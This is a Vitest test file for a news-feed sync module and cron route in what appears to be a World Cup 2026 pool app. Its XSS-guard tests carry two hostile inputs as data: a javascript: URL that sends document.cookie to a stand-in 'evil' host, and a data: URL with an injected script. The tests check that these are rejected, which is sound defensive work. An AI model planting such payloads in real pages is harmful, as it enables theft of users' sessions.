import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  buildNewsRequestUrl,
  dedupKeyFor,
  mapNewsApiResponse,
  normalizeSourceUrl,
} from "@/lib/news";

describe("normalizeSourceUrl", () => {
  it("strips query string and fragment", () => {
    expect(normalizeSourceUrl("https://ex.com/a/b?utm=1&x=2#frag")).toBe(
      "https://ex.com/a/b",
    );
  });

  it("lowercases the host but preserves path case", () => {
    expect(normalizeSourceUrl("https://Example.COM/A/B")).toBe(
      "https://example.com/A/B",
    );
  });

  it("strips a trailing slash on a path but keeps root slash", () => {
    expect(normalizeSourceUrl("https://ex.com/a/b/")).toBe("https://ex.com/a/b");
    expect(normalizeSourceUrl("https://ex.com/")).toBe("https://ex.com/");
  });

  it("is idempotent", () => {
    const once = normalizeSourceUrl("https://Ex.com/a/?q=1#h");
    expect(normalizeSourceUrl(once)).toBe(once);
  });

  it("falls back to the trimmed input when not a URL", () => {
    expect(normalizeSourceUrl("  not a url  ")).toBe("not a url");
  });
});

describe("dedupKeyFor", () => {
  it("prefers the external id when present", () => {
    expect(dedupKeyFor("abc123", "https://ex.com/x")).toBe("id:abc123");
  });

  it("falls back to a normalized-URL key when id is null", () => {
    expect(dedupKeyFor(null, "https://ex.com/x/?utm=1")).toBe(
      "url:https://ex.com/x",
    );
  });

  it("yields the same key for URLs differing only by query string", () => {
    const a = dedupKeyFor(null, "https://ex.com/story?ref=a");
    const b = dedupKeyFor(null, "https://ex.com/story?ref=b");
    expect(a).toBe(b);
  });
});

describe("mapNewsApiResponse", () => {
  it("maps fields and drops items missing url, title, or date", () => {
    const out = mapNewsApiResponse({
      articles: [
        {
          source: { name: "BBC" },
          title: "Hosts name squad",
          description: "A summary.",
          url: "https://bbc.com/a",
          urlToImage: "https://bbc.com/a.jpg",
          publishedAt: "2026-06-01T10:00:00Z",
        },
        { title: "No url", publishedAt: "2026-06-01T10:00:00Z" }, // dropped
        { url: "https://x.com/b", title: "No date" }, // dropped
      ],
    });
    expect(out).toHaveLength(1);
    expect(out[0]).toMatchObject({
      dedupKey: "url:https://bbc.com/a",
      sourceUrl: "https://bbc.com/a",
      title: "Hosts name squad",
      summary: "A summary.",
      imageUrl: "https://bbc.com/a.jpg",
      source: "BBC",
      publishedAt: "2026-06-01T10:00:00Z",
    });
  });

  it("deduplicates within a batch by dedup key (first wins)", () => {
    const out = mapNewsApiResponse({
      articles: [
        {
          title: "First",
          url: "https://ex.com/story?ref=a",
          publishedAt: "2026-06-01T10:00:00Z",
        },
        {
          title: "Duplicate URL, different query",
          url: "https://ex.com/story?ref=b",
          publishedAt: "2026-06-01T11:00:00Z",
        },
      ],
    });
    expect(out).toHaveLength(1);
    expect(out[0].title).toBe("First");
  });
});

describe("mapNewsApiResponse — untrusted scheme handling", () => {
  it("drops articles whose URL is not http(s) (XSS guard)", () => {
    const out = mapNewsApiResponse({
      articles: [
        {
          title: "Malicious",
          url: "javascript:fetch('//evil/?c='+document.cookie)",
          publishedAt: "2026-06-01T10:00:00Z",
        },
        {
          title: "Good",
          url: "https://ex.com/ok",
          publishedAt: "2026-06-01T10:00:00Z",
        },
      ],
    });
    expect(out).toHaveLength(1);
    expect(out[0].sourceUrl).toBe("https://ex.com/ok");
  });

  it("nulls out an off-scheme image but keeps the article", () => {
    const out = mapNewsApiResponse({
      articles: [
        {
          title: "Good link, bad image",
          url: "https://ex.com/ok",
          urlToImage: "data:text/html,<script>alert(1)</script>",
          publishedAt: "2026-06-01T10:00:00Z",
        },
      ],
    });
    expect(out).toHaveLength(1);
    expect(out[0].imageUrl).toBeNull();
  });
});

describe("buildNewsRequestUrl", () => {
  it("sets query, sort, and page size but never the secret", () => {
    const url = new URL(buildNewsRequestUrl("https://api.example/everything"));
    expect(url.searchParams.get("apiKey")).toBeNull();
    expect(url.searchParams.has("token")).toBe(false);
    expect(url.searchParams.get("sortBy")).toBe("publishedAt");
    expect(url.searchParams.get("q")).toContain("World Cup 2026");
  });
});

// --- Cron route -----------------------------------------------------------

const CRON_SECRET = "test-secret";
const NEWS_TOKEN = "test-news-token";

const fromMock = vi.fn();
const upsertMock = vi.fn();
const inMock = vi.fn();
const selectMock = vi.fn();

let existingKeys: { dedup_key: string }[] = [];

vi.mock("@/lib/env", () => ({
  env: {
    supabaseUrl: "https://example.supabase.co",
    supabaseAnonKey: "anon",
    siteUrl: "http://localhost:3000",
    cronSecret: CRON_SECRET,
    newsApiToken: NEWS_TOKEN,
    newsApiUrl: null,
  },
}));

vi.mock("@/lib/supabase/admin", () => ({
  createAdminSupabaseClient: vi.fn(() => ({ from: fromMock })),
}));

// The sync-news route resolves the news query from the active competition's
// branding; stub it to the World Cup default so the request URL is unchanged.
vi.mock("@/lib/competition", () => ({
  getActiveBranding: vi.fn(async () => ({
    shortName: "World Cup 2026",
    siteName: "World Cup 2026 Pool",
    brandCode: "WC26",
    ogAlt: "World Cup 2026 Pool",
    emailFromName: "World Cup Pools",
    newsQuery: '"World Cup 2026" OR "FIFA World Cup 2026"',
  })),
}));

function makeRequest(headers: Record<string, string> = {}): Request {
  return new Request("http://localhost/api/cron/sync-news", { headers });
}

function feedResponse() {
  return new Response(
    JSON.stringify({
      articles: [
        {
          source: { name: "BBC" },
          title: "Story one",
          description: "d1",
          url: "https://bbc.com/1",
          urlToImage: null,
          publishedAt: "2026-06-01T10:00:00Z",
        },
      ],
    }),
    { status: 200 },
  );
}

beforeEach(() => {
  existingKeys = [];
  fromMock.mockReset();
  upsertMock.mockReset();
  upsertMock.mockResolvedValue({ error: null });
  inMock.mockReset();
  inMock.mockImplementation(() =>
    Promise.resolve({ data: existingKeys, error: null }),
  );
  selectMock.mockReset();
  selectMock.mockImplementation(() => ({ in: inMock }));
  fromMock.mockImplementation(() => ({
    select: selectMock,
    upsert: upsertMock,
  }));
});

afterEach(() => {
  vi.clearAllMocks();
  vi.unstubAllGlobals();
});

describe("GET /api/cron/sync-news", () => {
  it("returns 401 when bearer is missing", async () => {
    const { GET } = await import("@/app/api/cron/sync-news/route");
    const res = await GET(makeRequest() as never);
    expect(res.status).toBe(401);
  });

  it("returns 401 when bearer is wrong", async () => {
    const { GET } = await import("@/app/api/cron/sync-news/route");
    const res = await GET(makeRequest({ authorization: "Bearer wrong" }) as never);
    expect(res.status).toBe(401);
  });

  it("inserts new articles on first run", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => feedResponse()));
    const { GET } = await import("@/app/api/cron/sync-news/route");
    const res = await GET(
      makeRequest({ authorization: `Bearer ${CRON_SECRET}` }) as never,
    );
    expect(res.status).toBe(200);
    const body = (await res.json()) as Record<string, number>;
    expect(body.fetched).toBe(1);
    expect(body.inserted).toBe(1);
    expect(body.updated).toBe(0);
    expect(upsertMock).toHaveBeenCalledTimes(1);
  });

  it("is idempotent — a re-run reports updated, not inserted", async () => {
    existingKeys = [{ dedup_key: "url:https://bbc.com/1" }];
    vi.stubGlobal("fetch", vi.fn(async () => feedResponse()));
    const { GET } = await import("@/app/api/cron/sync-news/route");
    const res = await GET(
      makeRequest({ authorization: `Bearer ${CRON_SECRET}` }) as never,
    );
    expect(res.status).toBe(200);
    const body = (await res.json()) as Record<string, number>;
    expect(body.fetched).toBe(1);
    expect(body.inserted).toBe(0);
    expect(body.updated).toBe(1);
    expect(upsertMock).toHaveBeenCalledWith(expect.any(Array), {
      onConflict: "dedup_key",
    });
  });
});
